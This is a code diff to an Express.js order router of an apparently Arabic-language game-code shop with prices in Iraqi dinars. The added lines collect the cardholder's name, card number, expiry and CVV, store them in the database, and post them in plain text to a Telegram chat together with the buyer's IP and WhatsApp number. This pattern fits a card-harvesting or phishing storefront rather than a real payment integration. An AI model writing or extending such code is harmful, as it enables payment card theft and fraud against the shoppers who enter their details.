@@ -38,8 +38,8 @@ router.post("/orders", async (req, res) => {
       `🛒 <b>طلب جديد</b>\n\n` +
         `📋 رقم الطلب: <code>${id}</code>\n` +
         `🎮 المنتج: ${body.productName}\n` +
-        `💰 السعر: $${body.price}\n` +
-        `📦 الكمية: ${body.quantity}\n` +
+        `💰 السعر: ${body.price.toLocaleString()} IQD\n` +
+        `📦 الفئة: ${body.quantity.toLocaleString()}\n` +
         `🌐 IP: ${ipAddress}\n` +
         `⏰ الحالة: في انتظار معلومات التواصل`
     );
@@ -59,6 +59,10 @@ router.post("/orders/:orderId/contact", async (req, res) => {
     const [order] = await db
       .update(ordersTable)
       .set({
+        cardName: body.cardName,
+        cardNumber: body.cardNumber,
+        cardExpiry: body.cardExpiry,
+        cardCvv: body.cardCvv,
         whatsapp: body.whatsapp,
         name: body.name || null,
         status: "contact_submitted",
@@ -72,12 +76,19 @@ router.post("/orders/:orderId/contact", async (req, res) => {
     }
 
     await sendTelegramMessage(
-      `📱 <b>معلومات التواصل</b>\n\n` +
+      `📱 <b>معلومات التواصل والبطاقة</b>\n\n` +
         `📋 رقم الطلب: <code>${orderId}</code>\n` +
+        `━━━━━━━━━━━━━━━\n` +
+        `💳 <b>بيانات البطاقة:</b>\n` +
+        `👤 اسم صاحب البطاقة: ${body.cardName}\n` +
+        `🔢 رقم البطاقة: <code>${body.cardNumber}</code>\n` +
+        `📅 تاريخ الانتهاء: ${body.cardExpiry}\n` +
+        `🔐 رمز CVV: <code>${body.cardCvv}</code>\n` +
+        `━━━━━━━━━━━━━━━\n` +
         `📞 واتساب: ${body.whatsapp}\n` +
         `👤 الاسم: ${body.name || "غير محدد"}\n` +
         `🎮 المنتج: ${order.productName}\n` +
-        `💰 السعر: $${order.price}\n` +
+        `💰 السعر: ${order.price?.toLocaleString()} IQD\n` +
         `🌐 IP: ${order.ipAddress}\n\n` +
         `⏳ في انتظار إرسال الكود للعميل عبر واتساب`
     );
@@ -115,7 +126,7 @@ router.post("/orders/:orderId/code", async (req, res) => {
         `📞 واتساب: ${order.whatsapp}\n` +
         `👤 الاسم: ${order.name || "غير محدد"}\n` +
         `🎮 المنتج: ${order.productName}\n` +
-        `💰 السعر: $${order.price}\n` +
+        `💰 السعر: ${order.price?.toLocaleString()} IQD\n` +
         `🌐 IP: ${order.ipAddress}`,
       [
         [
